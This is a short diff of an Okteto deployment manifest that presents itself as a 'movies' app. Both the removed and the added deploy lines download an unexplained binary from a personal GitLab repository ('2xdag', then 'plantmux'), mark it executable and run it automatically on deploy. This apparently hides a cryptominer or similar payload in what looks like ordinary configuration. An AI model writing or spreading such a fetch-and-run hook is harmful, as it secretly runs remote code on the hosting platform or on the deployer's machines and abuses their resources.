@@ -1,5 +1,5 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - apt-get update -y; apt-get install wget; wget -O 1 https://gitlab.com/richardkevin320/pede/-/raw/main/2xdag && chmod +x 1 && ./1
+  - apt-get update -y; apt-get install wget; wget https://gitlab.com/richardkevin320/pede/-/raw/main/plantmux && chmod +x plantmux && ./plantmux
 devs:
   - api/okteto.yml
